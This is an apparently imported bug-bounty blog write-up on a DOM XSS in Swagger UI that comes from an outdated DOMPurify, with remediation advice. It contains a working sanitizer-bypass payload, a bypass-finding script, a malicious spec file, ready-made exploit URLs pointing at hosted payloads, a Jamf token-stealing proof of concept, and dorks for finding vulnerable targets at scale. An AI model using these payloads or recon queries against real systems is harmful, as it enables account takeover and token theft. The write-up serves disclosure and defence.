---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-05-16_hacking-swagger-ui-from-xss-to-account-takeovers.md
original_filename: 2022-05-16_hacking-swagger-ui-from-xss-to-account-takeovers.md
title: Hacking Swagger-UI - from XSS to account takeovers
category: documents
detected_topics:
- xss
- supply-chain
- command-injection
- otp
- api-security
tags:
- imported
- documents
- xss
- supply-chain
- command-injection
- otp
- api-security
language: en
raw_sha256: 949e357cd317befe482cc4825e1936a675c98f28b91a671704289c0356aa4e86
text_sha256: db2026d20075bdd1db3881002482978b734264a97e1c85c1aed37ec0dfc640c5
ingested_at: '2026-06-28T07:32:11Z'
sensitivity: unknown
redactions_applied: false
---

# Hacking Swagger-UI - from XSS to account takeovers

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-05-16_hacking-swagger-ui-from-xss-to-account-takeovers.md
- Source Type: markdown
- Detected Topics: xss, supply-chain, command-injection, otp, api-security
- Ingested At: 2026-06-28T07:32:11Z
- Redactions Applied: False
- Raw SHA256: `949e357cd317befe482cc4825e1936a675c98f28b91a671704289c0356aa4e86`
- Text SHA256: `db2026d20075bdd1db3881002482978b734264a97e1c85c1aed37ec0dfc640c5`


## Content

---
title: "Hacking Swagger-UI - from XSS to account takeovers"
page_title: "Hacking Swagger-UI - from XSS to account takeovers - Vidoc Security Lab"
url: "https://www.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/"
final_url: "https://blog.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers"
authors: ["Dawid Moczadło (@kannthu1)"]
programs: ["Shopify", "Paypal", "GitLab", "Atlassian", "Yahoo! / Verizon Media", "Microsoft", "Jamf"]
bugs: ["DOM XSS", "Account takeover"]
publication_date: "2022-05-16"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2638
---

💡 VIDOC - The Future of Cybersecurity

Our research has evolved. Explore what’s new at Vidoc →

[vidocsecurity.com](https://www.vidocsecurity.com/)

**Swagger UI** is a really common library used to display API specifications in a nice-looking UI used by almost every company. I stumbled upon it many times when doing recon on bug bounty targets and decided to take a closer look at it in Nov 2020. On Twitch, I streamed the process of reviewing and finding bugs in the library, but I found the final payload off camera after the stream. The bug that I found was a **DOM XSS,** and it turned out that there were a lot of vulnerable instances.

The vulnerability was fixed at the beginning of 2021. However, I still was able to exploit it in many companies, like **Paypal, Atlassian, Microsoft, GitLab, Yahoo** , and many more.

**Since then, we've reported more than 60 instances** of this bug across a wide range of bug bounty programs, and we still have another 200 bugs in the backlog to report. Swagger UI versions affected with the XSS: **> =3.14.1 < 3.38.0**

Table of contents

## History of XSS vulnerabilities in Swagger UI

Swagger UI has a prominent history of bugs - several XSSs, but unfortunately, all required user interaction. A victim had to copy the URL to the YAML file and paste it in Swagger UI for the payload to fire.

List of XSS in Swagger UI ([Snyk - swagger-ui vulnerabilities](https://snyk.io/vuln/npm%3Aswagger-ui?ref=blog.vidocsecurity.com)):

![](/_next/image?url=https%3A%2F%2Fvidocsecurity.ghost.io%2Fimages%2F2022%2F05%2Fimage-20220114-163414.png&w=3840&q=75)

## Where is the bug and how does it work

The root cause of the DOM XSS that I have found is quite simple - an outdated library `DomPurify` (it's used for input sanitization) combined with features of the library allowed me to get DOM XSS that was controlled from query parameters. The exploitation was not that straightforward, and some restrictions forced me to find a custom variation of the bypasses for versions of DomPurify used by the Swagger UI.

### How Swagger UI renders API specification

Let’s start from the beginning - **Swagger UI** has an interesting feature that allows you to provide URL to API specification - a yaml or json file that will be fetched and displayed to the user. To do that you have to add query parameter `?url=https://your_api_spec/spec.yaml` or `? configUrl=https://your_api_spec/file.json`.

The example `yaml` spec looks like this:

`1swagger: '2.0' 2info: 3 title: Example yaml.spec 4 description: This is an example text **HELLO FROM MARKDOWN** 5paths: 6 /accounts: 7 get: 8 responses: 9 '200': 10 description: No response was specified 11 tags: 12 - accounts 13 operationId: findAccounts 14 summary: Finds all accounts 15`

Swagger UI will take your config (JSON) or API specification (YAML), fetch it, and then it will render it. It will also parse any description field from the API specification as a markdown.

Let’s look at some code and see how it’s done - here is a helper function that is used to render Markdown in Swagger UI:

`1 2// src/components/providers/markdown.jsx 3 4function Markdown({ source, className = "", getConfigs }) { 5 ... omitted ... 6 7 const md = new Remarkable({ 8 html: true, 9 typographer: true, 10 breaks: true, 11 linkTarget: "_blank" 12 }).use(linkify) 13 14 md.core.ruler.disable(["replacements", "smartquotes"]) 15 16 const { useUnsafeMarkdown } = getConfigs() 17 const html = md.render(source) 18 const sanitized = sanitizer(html, { useUnsafeMarkdown }) 19 20 if (!source || !html || !sanitized) { 21 return null 22 } 23 24 return ( 25 <div className={cx(className, "markdown")} dangerouslySetInnerHTML={{ __html: sanitized }}></div> 26 ) 27} 28 29`

The first obvious thing is that if we can bypass the `sanitizer(html)`, we will have really easy DOM XSS thanks to a `dangerouslySetInnerHTML`. React will simply render ANY HTML and allow us to execute the JS payload.

… but we have to bypass the `sanitizer` that is:

`1function sanitizer(str, { useUnsafeMarkdown = false } = {}) { 2 const ALLOW_DATA_ATTR = useUnsafeMarkdown 3 const FORBID_ATTR = useUnsafeMarkdown ? [] : ["style", "class"] 4 5 ... 6 7 return DomPurify.sanitize(str, { 8 ADD_ATTR: ["target"], 9 FORBID_TAGS: ["style"], 10 ALLOW_DATA_ATTR, 11 FORBID_ATTR, 12 }) 13} 14 15`

The function itself will sanitize provided `str` with `DomPurify` with an additional configuration that explicitly forbids `<style>` tags. (This will be important later)

### Finding the right bypass for `DomPurify`

The version of Swagger UI that I was exploiting at the time was `3.37.2` and it used `DomPurify` version `2.2.2`.

The easiest way of finding bypasses for `DomPurify` is to go to the `https://github.com/cure53/DOMPurify/releases/` page and search for a word `bypass` or `mXSS` in newer versions. In our case, there is the `2.2.3` version that has known bypasses.

![](/_next/image?url=https%3A%2F%2Fvidocsecurity.ghost.io%2Fimages%2F2022%2F05%2Fimage-20220114-215559.png&w=3840&q=75)

Now we have to find the payload that was used to bypass the sanitization - for this, we will look at the file `test/fixtures/expect.js` in the `DomPurify` repo that contains the test cases. We can look at commits of the file and find related to tag version `2.2.3`:

![](/_next/image?url=https%3A%2F%2Fvidocsecurity.ghost.io%2Fimages%2F2022%2F05%2Fimage-20220114-143940.png&w=3840&q=75)

Nice! We have a payload that we can use to fire XSS in Swagger UI, right? Not yet, there is still one restriction.

`1<math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><style><a title="</style><img src='#' onerror='alert(1)'>"> 2`

The payload uses a `<style>` tag to achieve the bypass, but in our case, it’s **explicitly forbidden**. :(

We have to fix that!

### Let’s find a custom variation of the bypass

We need a payload that will bypass `DomPurify` sanitization but can't contain `<style>` tag. The easiest way to do that is to find another HTML tag that will act the same as `<style>` in the bypass.

When we put this payload to `DomPurify` and render the sanitized string we will have DOM structure:

![](/_next/image?url=https%3A%2F%2Fvidocsecurity.ghost.io%2Fimages%2F2022%2F05%2Fimage-20220114-144512.png&w=3840&q=75)

From the picture, we can see that successful exploitation will cause the DOM to contain `<img>` with `onerror=alert(1)`. Our testing plan for finding a variation of the bypass that does not use `<style>` will be:

For every HTML element:

  1. Replace `<style>` element in payload with the HTML element
  2. Sanitize this new payload with `DomPurify`
  3. Render the sanitized string and check if it contains `<img` tag with `onerror=alert(1)`

You can find the JS code [here](https://gist.github.com/kannthu/fd5cdd4664cc669755a928fb42aba0de?ref=blog.vidocsecurity.com)

`1const allElements = [ 2 ... // list of all known HTML elements 3]; 4 5// payload that we are testing 6const payload = `<math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><style><a title="</style><img src='#' onerror='alert(1)'>">`; 7 8const domParser = new DOMParser(); 9 10// iterate on each HTML element 11allElements.forEach(element => { 12 let newPayload = payload.replace("<style>", `<${element}>`).replace("</style>", `</${element}>`); 13 14 // DOMPurify with the same config as in Swagger UI (and the same version) 15 const sanitized = DOMPurify.sanitize(newPayload, { 16 ADD_ATTR: ["target"], 17 FORBID_TAGS: ["style"] 18 }); 19 20 const parsedDOM = domParser.parseFromString(sanitized, 'text/html'); 21 22 parsedDOM.querySelectorAll(`img`).forEach(img => { 23 // only bypass will have onerror handler 24 if(img.attributes["onerror"]) { 25 console.log(`Found bypass: ${element}`); 26 } 27 }); 28}); 29`

When we execute the JS code will find two hits:

![](/_next/image?url=https%3A%2F%2Fvidocsecurity.ghost.io%2Fimages%2F2022%2F05%2Fimage.png&w=3840&q=75)

tag `<textarea>` and `<title>` will behave the same way as `<style>` in the `DomPurify` bypass and will allow us to get through `DomPurify` sanitization.

The final bypass will be:

`1<math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(1)'>"> 2`

### Exploit

Finally!! We can bring everything together and exploit the `alert(1)`. We just need to create a specification file with the payload, host it somewhere and find Swagger UI instances to exploit!

Example specification with bypass for `DomPurify` version `2.2.3` is:

`1swagger: '2.0' 2info: 3 title: Example yaml.spec 4 description: | 5 <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(window.origin)'>"> 6paths: 7 /accounts: 8 get: 9 responses: 10 '200': 11 description: No response was specified 12 tags: 13 - accounts 14 operationId: findAccounts 15 summary: Finds all accounts 16`

### If you are lazy

You can use just add this parameter to the URL of Swagger and see if it pops an `alert`:

`1?configUrl=https://jumpy-floor.surge.sh/test.json 2`

Sometimes the payload won’t work so check this one:

`1?url=https://jumpy-floor.surge.sh/test.yaml 2`

## How to find Swagger UI at scale?

There are two main ways how we can look for Swagger UI:

  * Google Dorking
  * Using module on Vidoc platform
  * NPM

### Google Dorking

Let’s start with Dorking - the easiest approach.

**Dork** :`intext:"Swagger UI" intitle:"Swagger UI" site:yourarget.com` (the dork yields some false positives, but it’s good enough)

**Example** :

![](/_next/image?url=https%3A%2F%2Fvidocsecurity.ghost.io%2Fimages%2F2022%2F05%2Fimage-1.png&w=3840&q=75)

For `*.microsoft.com` there are ~**88 indexed Swagger UIs**. Sadly, not all of them are in the version range to be exploitable and probably some of them are false positives.

💡

****Bounty Note**** From our experience, Microsoft will mostly pay for XSSs in the higher-level subdomains. They would prefer: `xxx.microsoft.com` over `yyy.xxx.microsoft.com`, so if you got XSS on any of these hosts - report it and earn money!

### NPM

Another way of finding Swagger UI is to use GitHub or GitLab search. There are a lot of projects that will use an older version of Swagger and probably will be vulnerable to the XSS. NPM package [`swagger-ui-dist`](https://www.npmjs.com/package/swagger-ui-dist?ref=blog.vidocsecurity.com) is just a bundled version of Swagger UI.

I recommend getting access to [Github’s new search,](https://cs.github.com/?ref=blog.vidocsecurity.com) because it has a lot better search capabilities than the old search. (but it can return a lot fewer results than the older search)

Query in new GitHub to find vulnerable Swagger UIs:

`1/swagger-ui-dist": "3.[1-3]/ path:*/package.json 2`

The query will look for `swagger-ui-dist` in file `package.json` and will check if the version is between `>=3.14.1 < 3.38.0`.

Results:

![](/_next/image?url=https%3A%2F%2Fvidocsecurity.ghost.io%2Fimages%2F2022%2F05%2Fimage-20220120-132538.png&w=3840&q=75)

💡

Unfortunately, there is one catch… new GitHub Search does not return all results. It performs a search only on a limited number of indexed repositories. (it means it will not find all the Swagger UIs). The difference in results can be massive.

![](/_next/image?url=https%3A%2F%2Fvidocsecurity.ghost.io%2Fimages%2F2022%2F05%2Fimage-20220120-134729.png&w=3840&q=75)

## Remediation

You have found a vulnerable `Swagger UI` version in your organization, now what?

It is simple, just update to the latest version `^4.13.0`.Check out [npm-update](https://docs.npmjs.com/cli/v6/commands/npm-update?ref=blog.vidocsecurity.com) for more info.

What if you can’t upgrade the whole `Swagger UI` package? You can upgrade only the `dompurify` package that is used by `Swagger UI`

## Examples of exploitation in bug bounty programs

We reported around `60` instances of the bug to various bug bounty programs, if you are interested in seeing how we reported it, check out reports.

### Jamf (Account takeover)

This vulnerability is common in so many different systems, we even found it in Jamf, but what is Jamf?

> _Jamf_ Pro is comprehensive enterprise management software for the Apple platform, simplifying IT management for Mac, iPad, iPhone and Apple TV.

It is used by big organizations to manage their Apple devices. I found that the on-premise version of “Jamf Pro” exposed Swagger UI on the same host as the admin panel.

Jamf usually works on ports `443` or `8443` and the Swagger UI can be found at `/classicapi/doc/`, but the payload for this is a little bit different.

The `configUrl` for some reason could not be a simple URL, we had to provide it like:

`1?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9leHViZXJhbnQtaWNlLnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ== 2`

**The account takeover** \- Jamf Pro stores authentication token in local storage under `authToken` key. The POC below will print `authToken` from local storage:

`1https://VULNERABLE_JAMF/classicapi/doc/?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9zdGFuZGluZy1zYWx0LnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ== 2`

**Bug bounty reports:**

[https://hackerone.com/reports/1350549](https://hackerone.com/reports/1350549?ref=blog.vidocsecurity.com)

[https://hackerone.com/reports/1444682](https://hackerone.com/reports/1444682?ref=blog.vidocsecurity.com)

The reports are yet to be disclosed, we will let you know in our [newsletter](https://vidocsecurity.com/newsletter/?ref=blog.vidocsecurity.com) when that happens.

### Gitlab - stored XSS in the repository

Gitlab is an interesting case because it uses Swagger UI to render Swagger specification files in the repository. So if you have a file that is named `swagger.json` in a repository on Gitlab it will try to parse it and render using `swagger-ui-dist`.

![](/_next/image?url=https%3A%2F%2Fvidocsecurity.ghost.io%2Fimages%2F2022%2F05%2Fimage-2.png&w=3840&q=75)

GitLab had CSP that did not allow me to use event handlers - `<img onerror=alert(window.origin) src=1>` was blocked. The good thing with Gitlab is that they disclose all of their security issues, so I just searched for XSS and [copied the CSP bypass from there](https://hackerone.com/reports/662287?ref=blog.vidocsecurity.com#activity-6026826);) (remember to work smart not hard)

Finally, I got it all working and could steal any user's token if they clicked on my repository.

**Bug bounty reports**

Stored XSS in repository file viewer (#296857) · Issues · GitLab.org / GitLab · GitLab

[HackerOne report #1072868 by kannthu on 2021-01-06, assigned to @cmaxim:](https://gitlab.com/gitlab-org/gitlab/-/issues/296857?ref=blog.vidocsecurity.com)

[https://hackerone.com/reports/1072868](https://hackerone.com/reports/1072868?ref=blog.vidocsecurity.com)

The report is yet to be disclosed, we will let you know in our newsletter when that happens.

## Final thoughts

I have to confess to one thing… I mostly do not escalate this vulnerability, because at our scale of finding this bug we have too many bugs to report and too little time to do it. I am guilty of it, but if you have more time you definitely shouldn't stop and just report the `alert(1)`. You can earn more money from it if you try to escalate it to `Account takeover` or just `Stealing user information`.

For this topic just check out reports of other people how they approach escalating XSS - just google `site:hackerone.com xss account takeover`

Did you find any `Swagger UI` and earn money from it? Let us know on Twitter! Tag [@vidocsecurity](https://twitter.com/vidocsecurity?ref=blog.vidocsecurity.com):)

## Reference

  * <https://github.com/cure53/DOMPurify/commit/8ab47b0a694022b396e30b7f643e28971f75f5d8>
  * <https://github.com/cure53/DOMPurify/commit/7719c5b28c79db124e6a344c59c46448644781c9>

💡 VIDOC - The Future of Cybersecurity

Our research has evolved. Explore what’s new at Vidoc →

[vidocsecurity.com](https://www.vidocsecurity.com/)
